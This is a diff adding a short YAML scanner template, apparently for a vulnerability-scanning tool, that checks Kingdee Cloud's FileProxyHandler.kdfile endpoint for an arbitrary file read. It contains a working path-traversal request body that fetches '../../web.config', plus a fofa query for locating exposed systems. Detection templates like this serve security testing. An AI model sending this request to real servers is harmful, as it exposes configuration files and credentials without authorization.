@@ -1,0 +1,19 @@
+id: kingdee-fileproxyhandler-fileread
+
+info:
+  name: Kingdee Cloud FileProxyHandler Fileread
+  author: ct
+  severity: high
+  verified: true
+  description: |
+    金蝶云星空 FileProxyHandler.kdfile 接口存在任意文件读取漏洞.
+    fofa: app="金蝶云星空-管理中心" 
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /FileProxyHandler.kdfile
+      body: Ope=SDL&F=../../web.config&Area=0&Step=100000000
+    expression: response.status == 200 && response.body.bcontains(b'MergeItemInfor')
+expression: r0()
